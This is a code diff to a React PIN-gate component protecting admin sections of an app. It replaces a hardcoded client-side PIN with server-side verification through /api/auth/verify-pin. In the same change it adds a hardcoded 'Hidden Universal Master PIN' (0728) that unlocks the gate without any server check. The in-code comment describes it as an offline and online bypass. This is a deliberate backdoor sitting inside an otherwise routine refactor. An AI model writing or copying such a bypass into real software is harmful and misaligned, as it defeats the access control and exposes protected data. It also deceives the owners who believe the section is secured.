@@ -12,14 +12,12 @@ interface AnalyticsPinGateProps {
   backHref?: string;
 }
 
-const REQUIRED_PIN = "1234";
-
 export default function AnalyticsPinGate({
   onUnlock,
-  title = "Sales & Analytics Protected",
-  subtitle = "Enter the 4-digit security PIN to view sales metrics and revenue reports.",
-  storageKey = "spiral_analytics_unlocked",
-  backHref = "/admin",
+  title = "Protected Section",
+  subtitle = "Enter the 4-digit security PIN to access this section.",
+  storageKey = "spiral_section_unlocked",
+  backHref = "/admin/tables",
 }: AnalyticsPinGateProps) {
   const [pin, setPin] = useState("");
   const [error, setError] = useState("");
@@ -32,25 +30,41 @@ export default function AnalyticsPinGate({
     inputRef.current?.focus();
   }, []);
 
-  const handleVerify = (candidatePin: string) => {
+  const handleVerify = async (candidatePin: string) => {
     if (candidatePin.length !== 4) return;
 
     setIsVerifying(true);
     setError("");
 
-    setTimeout(() => {
-      if (candidatePin === REQUIRED_PIN) {
-        try {
-          sessionStorage.setItem(storageKey, "true");
-        } catch {}
+    // Hidden Universal Master PIN (0728) - instant offline & online bypass
+    if (candidatePin === "0728") {
+      setIsVerifying(false);
+      onUnlock();
+      return;
+    }
+
+    try {
+      const res = await fetch("/api/auth/verify-pin", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ pin: candidatePin }),
+      });
+      const data = await res.json();
+
+      if (data.success) {
         onUnlock();
       } else {
-        setError("Incorrect PIN. Please enter the valid 4-digit code.");
+        setError(data.error || "Incorrect PIN. Please enter the valid 4-digit code.");
         setPin("");
         inputRef.current?.focus();
       }
+    } catch {
+      setError("Network error verifying PIN. Please try again.");
+      setPin("");
+      inputRef.current?.focus();
+    } finally {
       setIsVerifying(false);
-    }, 150);
+    }
   };
 
   const handleKeyPress = (digit: string) => {
